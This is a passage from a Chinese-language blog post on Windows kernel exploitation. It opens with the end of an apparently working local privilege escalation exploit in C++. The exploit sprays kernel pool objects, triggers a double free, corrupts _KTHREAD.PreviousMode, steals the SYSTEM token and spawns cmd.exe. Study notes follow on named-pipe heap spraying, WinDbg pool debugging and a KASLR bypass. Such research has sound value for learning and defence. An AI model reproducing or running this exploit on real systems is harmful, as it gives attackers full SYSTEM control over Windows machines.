size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// 首先得获得核心数</span></span><br><span class="line">	<span class="comment">// SYSTEM_INFO SystemInfo;</span></span><br><span class="line">	<span class="comment">// GetSystemInfo(&amp;SystemInfo);</span></span><br><span class="line">	<span class="comment">// GetNativeSystemInfo(&amp;SystemInfo);</span></span><br><span class="line">	<span class="comment">// CountConcurrentSprayEaFile = SystemInfo.dwNumberOfProcessors;</span></span><br><span class="line">	CountConcurrentSprayEaFile = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">wprintf</span>(<span class="string">L&quot;[*] Spray Io ...\r\n&quot;</span>);</span><br><span class="line">	ParamSprayEaFile* param = (ParamSprayEaFile*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(ParamSprayEaFile));</span><br><span class="line">	<span class="keyword">if</span> (param == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error malloc ParamSprayEaFile\r\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	param-&gt;PayloadSize = size - <span class="number">0x10</span>;</span><br><span class="line">	param-&gt;hPEAuth = <span class="built_in">CreateFileW</span>(<span class="string">L&quot;\\\\.\\PEAuth&quot;</span>, GENERIC_WRITE, <span class="number">0</span>, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (param-&gt;hPEAuth == INVALID_HANDLE_VALUE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error CreateFile PEAuth \r\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	param-&gt;payload = (UCHAR*)<span class="built_in">malloc</span>(param-&gt;PayloadSize);</span><br><span class="line">	<span class="keyword">if</span> (param-&gt;payload == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error malloc payload\r\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">RtlFillMemory</span>(param-&gt;payload, param-&gt;PayloadSize, <span class="string">&#x27;H&#x27;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// fake ProcessContext</span></span><br><span class="line">	*(ULONG32*)(&amp;param-&gt;payload[<span class="number">0x0</span>]) = <span class="number">0x636F7250</span>; <span class="comment">// Proc</span></span><br><span class="line">	<span class="comment">// FsContext-&gt;RequestAPC.Thread ; _ETHREAD._KTHREAD.PreviousMode</span></span><br><span class="line">	<span class="comment">// !!!!! Attation + 0x30</span></span><br><span class="line">	*(ULONG64*)(&amp;param-&gt;payload[<span class="number">0x38</span>]) = g_ExploitEthread + <span class="number">0x232</span> + <span class="number">0x30</span>; </span><br><span class="line">	<span class="comment">// fake ProcessContext</span></span><br><span class="line"></span><br><span class="line">	g_EaThreadList = (HANDLE*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(HANDLE) * CountConcurrentSprayEaFile);</span><br><span class="line">	<span class="keyword">if</span> (g_EaThreadList == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error malloc g_EaThreadList\r\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; CountConcurrentSprayEaFile; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		g_EaThreadList[i] = <span class="built_in">CreateThread</span>(<span class="number">0</span>, <span class="number">0</span>, ThreadSprayEaFile, param, CREATE_SUSPENDED, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">if</span> (g_EaThreadList[i] == <span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error CreateThread ThreadSprayEaFile\r\n&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 为指定线程设置处理器关联掩码</span></span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">SetThreadAffinityMask</span>(g_EaThreadList[i], <span class="number">1</span> &lt;&lt; i) == <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error SetThreadAffinityMask\r\n&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; CountConcurrentSprayEaFile; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// 递减线程的挂起计数。 当暂停计数减为零时，将恢复线程的执行</span></span><br><span class="line">		<span class="built_in">ResumeThread</span>(g_EaThreadList[i]);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 等待，直到一个或所有指定对象处于信号状态或超时间隔已过。</span></span><br><span class="line">	<span class="built_in">WaitForMultipleObjects</span>(CountConcurrentSprayEaFile, g_EaThreadList, TRUE, INFINITE);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; CountConcurrentSprayEaFile; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">CloseHandle</span>(g_EaThreadList[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">CloseHandle</span>(param-&gt;hPEAuth);</span><br><span class="line">	<span class="built_in">free</span>(param-&gt;payload);</span><br><span class="line">	<span class="built_in">free</span>(param);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">wprintf</span>(<span class="string">L&quot;[*] Spray Io done\r\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">Cleanup</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">wprintf</span>(<span class="string">L&quot;[+] cleanup...\r\n&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">CloseHandle</span>(g_hDevice);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (g_Pipe.<span class="built_in">size</span>() != <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (PIPE_HANDLES p : g_Pipe)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">CloseHandle</span>(p.r);</span><br><span class="line">			<span class="built_in">CloseHandle</span>(p.w);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span> <span class="params">(NTAPI *PNtReadVirtualMemory)</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	_In_ HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">	_In_opt_ PVOID BaseAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">	_Out_writes_bytes_(BufferSize) PVOID Buffer,</span></span></span><br><span class="line"><span class="params"><span class="function">	_In_ ULONG BufferSize,</span></span></span><br><span class="line"><span class="params"><span class="function">	_Out_opt_ PULONG NumberOfBytesRead</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(WINAPI* PNtWriteVirtualMemory)</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	_In_ HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">	_In_ PVOID BaseAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">	_In_ PVOID Buffer,</span></span></span><br><span class="line"><span class="params"><span class="function">	_In_ ULONG NumberOfBytesToWrite,</span></span></span><br><span class="line"><span class="params"><span class="function">	_Out_opt_ PULONG NumberOfBytesWritten</span></span></span><br><span class="line"><span class="params"><span class="function">	)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">wmain</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">atexit</span>(Cleanup);</span><br><span class="line">	<span class="built_in">wprintf</span>(<span class="string">L&quot;[+] Setup ...\r\n&quot;</span>);</span><br><span class="line">	<span class="built_in">Setup</span>();</span><br><span class="line">	g_ThreadExploitHandle = <span class="built_in">OpenThread</span>(THREAD_QUERY_INFORMATION, FALSE, <span class="built_in">GetCurrentThreadId</span>());</span><br><span class="line">	<span class="built_in">wprintf</span>(<span class="string">L&quot;[*] Hacking thread: %#llx\r\n&quot;</span>, (ULONG64)<span class="built_in">GetCurrentThreadId</span>());</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">wprintf</span>(<span class="string">L&quot;[+] LeakByQuerySystemInfomation\r\n&quot;</span>);</span><br><span class="line">	<span class="built_in">LeakByQuerySystemInfomation</span>();</span><br><span class="line">	<span class="comment">//std::cin.get();</span></span><br><span class="line">	<span class="built_in">Sleep</span>(<span class="number">3000</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">wprintf</span>(<span class="string">L&quot;[+] Defragment \r\n&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) </span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">Allocate32</span>(<span class="number">0x1b000</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">SprayPipe</span>(<span class="number">0x120</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">wprintf</span>(<span class="string">L&quot;[+] Allocate target \r\n&quot;</span>);</span><br><span class="line">	<span class="built_in">Allocate64</span>(<span class="number">0x1b000</span>);</span><br><span class="line">	<span class="built_in">wprintf</span>(<span class="string">L&quot;[+] Free first \r\n&quot;</span>);</span><br><span class="line">	<span class="built_in">Free64</span>();                            </span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="built_in">wprintf</span>(<span class="string">L&quot;[+] Ws2P =&gt; Mdl \r\n&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; CountSprayWs2P; i++) </span><br><span class="line">	&#123;</span><br><span class="line">		g_ProcessList[i] = <span class="built_in">CreateProcessFileHandle</span>(g_ThreadApcHandle);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//std::cin.get();</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">wprintf</span>(<span class="string">L&quot;[+] Allocate Memory avoid crash \r\n&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; CountSprayMm; i++) </span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">Allocate32</span>(<span class="number">0x1b000</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="built_in">wprintf</span>(<span class="string">L&quot;[+] Double free \r\n&quot;</span>);</span><br><span class="line">	<span class="built_in">Free64</span>();           </span><br><span class="line"></span><br><span class="line">	<span class="built_in">wprintf</span>(<span class="string">L&quot;[+] Eafile =&gt; Ws2P \r\n&quot;</span>);</span><br><span class="line">	<span class="built_in">SprayEaFile</span>(<span class="number">0x120</span>);</span><br><span class="line">	<span class="comment">//std::cin.get();</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 找了一天的 BUG</span></span><br><span class="line">	<span class="built_in">wprintf</span>(<span class="string">L&quot;[+] Close Ws2P Process Handle \r\n&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; CountSprayWs2P; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">CloseHandle</span>(g_ProcessList[i]);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//DWORD dwBytesWriten;</span></span><br><span class="line">	<span class="built_in">wprintf</span>(<span class="string">L&quot;[+] Exploiting... \r\n&quot;</span>);</span><br><span class="line">	<span class="built_in">wprintf</span>(<span class="string">L&quot;[*] Exploit thread: %#lx \r\n&quot;</span>, <span class="built_in">GetCurrentThreadId</span>());</span><br><span class="line">	<span class="comment">//WriteFile(sync.w, &quot;Y&quot;, 1, &amp;dwBytesWriten, NULL);</span></span><br><span class="line"></span><br><span class="line">	HANDLE hCur = <span class="built_in">GetCurrentProcess</span>();</span><br><span class="line">	<span class="comment">//std::cin.get();</span></span><br><span class="line">	<span class="built_in">Sleep</span>(<span class="number">1000</span>);</span><br><span class="line">	<span class="comment">//std::cin.get();</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 需要确保 _KTHREAD.PreviousMode为0</span></span><br><span class="line">	PNtWriteVirtualMemory NtWriteVirtualMemory = (PNtWriteVirtualMemory)::<span class="built_in">GetProcAddress</span>(::<span class="built_in">LoadLibraryW</span>(<span class="string">L&quot;ntdll.dll&quot;</span>), <span class="string">&quot;NtWriteVirtualMemory&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == NtWriteVirtualMemory)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error GetProcAddress NtWriteVirtualMemory\r\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//PNtReadVirtualMemory NtReadVirtualMemory = (PNtReadVirtualMemory)::GetProcAddress(::LoadLibraryW(L&quot;ntdll.dll&quot;), &quot;NtReadVirtualMemory&quot;);</span></span><br><span class="line">	<span class="comment">//if (NULL == NtWriteVirtualMemory)</span></span><br><span class="line">	<span class="comment">//&#123;</span></span><br><span class="line">	<span class="comment">//	wprintf(L&quot;[-] Error GetProcAddress NtReadVirtualMemory\r\n&quot;);</span></span><br><span class="line">	<span class="comment">//	exit(1);</span></span><br><span class="line">	<span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Write EPROCESS token =&gt; SYSTEM</span></span><br><span class="line">	<span class="built_in">wprintf</span>(<span class="string">L&quot;[+] Read System token ...\r\n&quot;</span>);</span><br><span class="line">	<span class="built_in">Sleep</span>(<span class="number">3000</span>);</span><br><span class="line">	ULONG BytesWritten = <span class="number">0</span>;</span><br><span class="line">	ULONG64 Token[] = &#123; <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="comment">// addr =&gt; buffer</span></span><br><span class="line">	<span class="built_in">NtWriteVirtualMemory</span>(</span><br><span class="line">		hCur,</span><br><span class="line">		&amp;Token,</span><br><span class="line">		(PVOID)(g_SystemEprocess + <span class="number">0x4b8</span> - <span class="number">0x10</span>), <span class="comment">//   +0x4b8 Token</span></span><br><span class="line">		<span class="built_in">sizeof</span>(Token),</span><br><span class="line">		&amp;BytesWritten);</span><br><span class="line">	<span class="built_in">wprintf</span>(<span class="string">L&quot;[*] Read System token: %#llx %#llx %#llx %#llx\n&quot;</span>, Token[<span class="number">0</span>], Token[<span class="number">1</span>], Token[<span class="number">2</span>], Token[<span class="number">3</span>]);</span><br><span class="line">	<span class="keyword">if</span> (BytesWritten == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error read token, please reboot...\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//std::cin.get();</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// buffer =&gt; address</span></span><br><span class="line">	<span class="built_in">NtWriteVirtualMemory</span>(</span><br><span class="line">		hCur,</span><br><span class="line">		(PVOID)(g_CurrentEprocess + <span class="number">0x4b8</span>),</span><br><span class="line">		&amp;Token[<span class="number">2</span>],</span><br><span class="line">		<span class="number">8</span>,</span><br><span class="line">		&amp;BytesWritten</span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// write back PreviousMode =&gt; 1</span></span><br><span class="line">	<span class="built_in">wprintf</span>(<span class="string">L&quot;[+] Write PrevoiuaMode 1\r\n&quot;</span>);</span><br><span class="line">	<span class="built_in">Sleep</span>(<span class="number">2000</span>);</span><br><span class="line">	BYTE PreviousMode = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">NtWriteVirtualMemory</span>(</span><br><span class="line">		hCur,</span><br><span class="line">		(PVOID)(g_ExploitEthread + <span class="number">0x232</span>),</span><br><span class="line">		&amp;PreviousMode,</span><br><span class="line">		<span class="number">1</span>,</span><br><span class="line">		&amp;BytesWritten</span><br><span class="line">	))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error NtWriteVirtualMemory\r\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">wprintf</span>(<span class="string">L&quot;[+] Get shell... \r\n&quot;</span>);</span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;cmd.exe&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="CLFS"><a href="#CLFS" class="headerlink" title="CLFS"></a>CLFS</h3><p>提了一嘴 CLFS，其UAF的利用</p>
<ul>
<li><a href="https://blog.exodusintel.com/2022/03/10/exploiting-a-use-after-free-in-windows-common-logging-file-system-clfs/">Exploiting a use-after-free in Windows Common Logging File System</a></li>
</ul>
<p>clfs.sys 漏洞也蛮多的</p>
<p>沉淀，todo…</p>
<h2 id="More"><a href="#More" class="headerlink" title="More"></a>More</h2><p>尝试解决问题时搜到了其他不错的文章，深度学习一下</p>
<h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p>微软的好东西总是需要我们自己探索。</p>
<p>工具箱： <a href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/sysinternals-suite">Sysinternals Suite</a></p>
<h3 id="windows-driver-reverse"><a href="#windows-driver-reverse" class="headerlink" title="windows driver reverse"></a>windows driver reverse</h3><p><a href="https://voidsec.com/windows-drivers-reverse-engineering-methodology/">windows-drivers-reverse-engineering</a></p>
<p>本人更喜欢使用网络来进行windbg调试</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">PS&gt; bcdedit /dbgsettings <span class="built_in">NET</span> HOSTIP:&lt;DEBUGGER_IP&gt; PORT:<span class="number">50000</span></span><br><span class="line">PS&gt; bcdedit /debug on</span><br></pre></td></tr></table></figure>

<h4 id="Devices-Symlinks"><a href="#Devices-Symlinks" class="headerlink" title="Devices &amp; Symlinks"></a>Devices &amp; Symlinks</h4><p><strong>Devices are interfaces that let processes interact with the driver</strong> while <strong>Symlink is an alias you can use while calling Win32 functions</strong>.</p>
<ul>
<li><code>IoCreateDevice</code> creates DeviceNames: <code>\Device\VulnerableDevice</code></li>
<li><code>IoCreateSymbolicLink</code> creates Symlinks: <code>\\.\VulnerableDevice</code></li>
</ul>
<p>设备的名称：</p>
<ul>
<li>设备命名后，其它内核模式部件可以通过调用IoGetDeviceObjectPointer函数找到该设备，找到设备对象后，就可以向该设备的驱动程序发送IRP。</li>
<li>允许应用程序打开命名设备的句柄，这样它们就可以向驱动程序发送IRP。</li>
</ul>
<p><strong>符号链接名：</strong> 驱动程序为设备创建符号链接，应用程序可以使用符号链接名称来访问设备</p>
<ul>
<li>设备是可以没有名字的，但是得存在符号链接用户态才能访问设备</li>
</ul>
<p>我们可以使用 Sysinternals Suite 里的 <code>winobj.exe</code> 来查看。</p>
<ul>
<li>global 搜索 symlink 就可以找到device</li>
</ul>
<h4 id="Dispatch-Routines"><a href="#Dispatch-Routines" class="headerlink" title="Dispatch Routines"></a>Dispatch Routines</h4><p>派遣函数 MajorFunction</p>
<h3 id="Windows-Kernel-HeapFengshui"><a href="#Windows-Kernel-HeapFengshui" class="headerlink" title="Windows Kernel HeapFengshui"></a>Windows Kernel HeapFengshui</h3><p><a href="https://www.alex-ionescu.com/kernel-heap-spraying-like-its-2015-swimming-in-the-big-kids-pool/">Windows HeapFengShui</a></p>
<p>这篇文章主要介绍了内核态的heap spraying，在HEVD UAF时看过，再看几遍</p>
<p>首先Windows内核提权手段</p>
<ul>
<li>修改权限相关的数据结构</li>
<li>内核态ROP</li>
</ul>
<p>Pool</p>
<ul>
<li>regular pool: 少于一个内存页大小的分配，X64下小于4064字节（16字节用于池头部，16字节分给初始的空闲块）</li>
<li>big pool: 大于于一个内存页大小的分配，没有预留头部空间，内存页是通过<code>nt!PoolBigPageTable</code>来索引跟踪的</li>
</ul>
<p>heap spray: Socket和 NamedPipe</p>
<ul>
<li>创建一个本地Socket套接字并监听，用另外一个线程连接该套接字，然后发出一个写操作（写的数据要超过4K），但不要读。</li>
<li>创建一个命名管道，然后发出一个写操作（同样数据大于4K），且不要读。这也将导致命名管道文件系统（NPFS.SYS）为管道数据分配一块非分页的内存块。</li>
<li>原因是因为 网络栈函数&#x2F;NPFS缓冲区 操作位于DISPATCH_LEVEL(IRQL 2)层，是NonPagedPool。</li>
</ul>
<p>named pipe 比较简单，只需要几行代码就能搞定。但是NPFS会在我们自己的缓冲区前面加上一个包含其自身内联头部的前缀，该前缀被称为<code>DATA_QUEUE_ENTRY</code>。NPFS头部的大小会随版本不同而略有差异</p>
<p><a href="https://securityinsecurity.github.io/exploiting-hevd-use-after-free/">Windows Kernel Exploitation</a>文章里使用这个技术，NPFS NpFr：</p>
<ul>
<li>调用 <code>CreatePipe</code> 创建readPipe和writePipe</li>
<li>然后WriteFile往writePipe里写入内容</li>
<li>存在一个0x48大小的BUFFER_HEADER，后面跟着数据，NonPagedPool</li>
</ul>
<p>通过tag寻找pool，这个命令很长时间才能出结果。如果想知道pool大小，可以使用<code>!poolused</code></p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">!poolfind TagString [PoolType]</span><br></pre></td></tr></table></figure>

<p>调试一下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE readPipe;</span><br><span class="line">	HANDLE writePipe;</span><br><span class="line">	BOOL res;</span><br><span class="line">	CHAR payload[<span class="number">0x30</span>];</span><br><span class="line"></span><br><span class="line">	<span class="built_in">RtlFillMemory</span>(payload, <span class="built_in">sizeof</span>(payload), <span class="number">0x43</span>);</span><br><span class="line"></span><br><span class="line">	res = <span class="built_in">CreatePipe</span>(&amp;readPipe, &amp;writePipe, <span class="literal">NULL</span>, <span class="built_in">sizeof</span>(payload));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!res)</span><br><span class="line">	&#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;[-] Error CreatePipe&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">WriteFile</span>(writePipe, payload, <span class="built_in">sizeof</span>(payload), <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;read: &quot;</span> &lt;&lt; readPipe &lt;&lt; <span class="string">&quot;write: &quot;</span> &lt;&lt; writePipe &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">DebugBreak</span>();</span><br><span class="line">	<span class="built_in">CloseHandle</span>(readPipe);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(writePipe);</span><br><span class="line">	<span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>两个handle，查看其中一个Handle信息。</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; !handle <span class="number">0</span>xA4</span><br><span class="line"></span><br><span class="line">PROCESS ffff9a8824cbd080</span><br><span class="line"><span class="function">    SessionId: <span class="title">none</span>  <span class="title">Cid</span>: 0004    <span class="title">Peb</span>: 00000000  <span class="title">ParentCid</span>: 0000</span></span><br><span class="line"><span class="function">    <span class="title">DirBase</span>: 001<span class="title">ad000</span>  <span class="title">ObjectTable</span>: <span class="title">ffffc98328c04040</span>  <span class="title">HandleCount</span>: 2813.</span></span><br><span class="line"><span class="function">    <span class="title">Image</span>: <span class="title">System</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Kernel</span> <span class="title">handle</span> <span class="title">table</span> <span class="title">at</span> <span class="title">ffffc98328c04040</span> <span class="title">with</span> 2813 <span class="title">entries</span> <span class="title">in</span> <span class="title">use</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">00<span class="title">a4</span>: <span class="title">Object</span>: <span class="title">ffff9a8826ffca20</span>  <span class="title">GrantedAccess</span>: 0012019<span class="title">f</span> (<span class="title">Protected</span>) (<span class="title">Inherit</span>) (<span class="title">Audit</span>) <span class="title">Entry</span>: <span class="title">ffffc98328cb2290</span></span></span><br><span class="line"><span class="function"><span class="title">Object</span>: <span class="title">ffff9a8826ffca20</span>  <span class="title">Type</span>: (<span class="title">ffff9a8824d1cae0</span>) <span class="title">File</span></span></span><br><span class="line"><span class="function">    <span class="title">ObjectHeader</span>: <span class="title">ffff9a8826ffc9f0</span> (<span class="title">new</span> <span class="title">version</span>)</span></span><br><span class="line"><span class="function">        <span class="title">HandleCount</span>: 1  <span class="title">PointerCount</span>: 32768</span></span><br><span class="line"><span class="function">        <span class="title">Directory</span> <span class="title">Object</span>: 00000000  <span class="title">Name</span>: \<span class="title">Device</span>\<span class="title">HarddiskVolume3</span>\$<span class="title">Extend</span>\$<span class="title">RmMetadata</span>\$<span class="title">TxfLog</span>\$<span class="title">TxfLog</span> &#123;<span class="title">clfs</span>&#125;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">0: <span class="title">kd</span>&gt; !<span class="title">pool</span> <span class="title">ffff9a8826ffca20</span> 2</span></span><br><span class="line"><span class="function"><span class="title">Pool</span> <span class="title">page</span> <span class="title">ffff9a8826ffca20</span> <span class="title">region</span> <span class="title">is</span> <span class="title">Nonpaged</span> <span class="title">pool</span></span></span><br><span class="line"><span class="function">*<span class="title">ffff9a8826ffc9a0</span> <span class="title">size</span>:  190 <span class="title">previous</span> <span class="title">size</span>:    0  (<span class="title">Allocated</span>) *<span class="title">File</span></span></span><br><span class="line"><span class="function">		<span class="title">Pooltag</span> <span class="title">File</span> : <span class="title">File</span> <span class="title">objects</span></span></span><br></pre></td></tr></table></figure>

<p>可以看出来NonPaged多了一个0x70大小的内存区域。当我们我们写入0x28大小，也是0x70，存在对齐情况。</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; !poolused <span class="number">1</span> NpFr</span><br><span class="line">Using a machine size of <span class="number">1</span>ffe7f pages to configure the kd cache</span><br><span class="line">........</span><br><span class="line"> Sorting by Tag</span><br><span class="line"></span><br><span class="line">                            NonPaged                                         Paged</span><br><span class="line"> Tag       Allocs       Frees      Diff         Used       Allocs       Frees      Diff         Used</span><br><span class="line"></span><br><span class="line"> NpFr        <span class="number">2905</span>        <span class="number">2904</span>         <span class="number">1</span>          <span class="number">112</span>            <span class="number">0</span>           <span class="number">0</span>         <span class="number">0</span>            <span class="number">0</span>	DATA_ENTRY records (read/write buffers) , Binary: npfs.sys</span><br><span class="line"></span><br><span class="line">TOTAL        <span class="number">2905</span>        <span class="number">2904</span>         <span class="number">1</span>          <span class="number">112</span>            <span class="number">0</span>           <span class="number">0</span>         <span class="number">0</span>            <span class="number">0</span></span><br></pre></td></tr></table></figure>


<p>多次写 0x30 大小</p>
<ul>
<li>写两次，就会是0xe0 &#x3D;&gt; 0x70 * 2</li>
<li>3次，0x150 &#x3D; 0x70 * 3</li>
</ul>
<p><a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/debuggercmds/-poolfind">poolfind (WinDbg)</a>，在本机一个多小时还是出不了结果🤣</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; !poolfind NpFr -nonpaged</span><br></pre></td></tr></table></figure>

<h3 id="NtQuerySystemInformation"><a href="#NtQuerySystemInformation" class="headerlink" title="NtQuerySystemInformation"></a>NtQuerySystemInformation</h3><p>文章中提到绕过 KASLR 的一个函数，这个函数可以在<code>ntdll.dll</code>中获取</p>
